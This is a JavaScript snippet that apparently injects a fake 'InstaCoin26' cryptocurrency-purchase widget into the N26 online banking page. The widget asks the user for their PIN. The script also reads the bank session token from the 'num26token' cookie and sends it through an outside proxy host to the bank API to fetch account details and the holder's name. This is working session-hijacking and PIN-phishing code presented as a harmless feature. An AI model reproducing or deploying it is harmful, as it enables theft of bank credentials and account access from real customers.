function initInstaCoin26() {
    // alert("Init: InstaCoin26 ...");

    var $invite = $('.UIHeader__invite-friends'),
        $accountInfo = $('.UIHeader__account-infos'),
        $InstaCoin26 = $('<div id="instacoin26" class="UIHeader__account-infos"><strong>InstaCoin26:</strong> <span class="instacoin26-info">Buy € 5 Cryptocoins instantly!</span> <span class="hidden instacoin26-form">Confirm with <input class="instacoin26-pin" type="password" placeholder="PIN" /> <button class="instacoin26-buy">Buy for € 5</button></span></div>');


    $invite.html($InstaCoin26).attr('href', '#instacoin26');
    $invite.attr('href', '#instacoin26').on('click', function(e) {
        e.preventDefault();

        $('.instacoin26-form').removeClass('hidden');
        $('.instacoin26-info').addClass('hidden');

    });

    $('.instacoin26-buy').on('click', function(e) {
        e.preventDefault();

        alert("InstaCoin26: processing your request ...");

        // https://api.tech26.de/api
        var api = "https://wad2018.coinfinity.co/InstaCoin26/api/proxy.php?url=https://api.tech26.de",
            bearer = cookieValue('num26token');

        $.ajax({
            type: 'GET',
            url: api + '/me?full=true',
            dataType: 'json',
            beforeSend: function(xhr) {
                xhr.setRequestHeader('Authorization', 'Basic ' + bearer);
                xhr.setRequestHeader('Origin: https://my.n26.com');
            },
            success: function(data) {
                alert('AccountID: ' + data.account.id + ' -- ' + data.userInfo.firstName + ' ' + data.userInfo.lastName);
            },
            error: function(data) {
                alert('/me error');
            }
        });
    });
}

function cookieValue(cookiename) {
    // Get name followed by anything except a semicolon
    var cookiestring = RegExp("" + cookiename + "[^;]+").exec(document.cookie);
    // Return everything after the equal sign, or an empty string if the cookie name not found
    return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./, "") : "");
}

initInstaCoin26();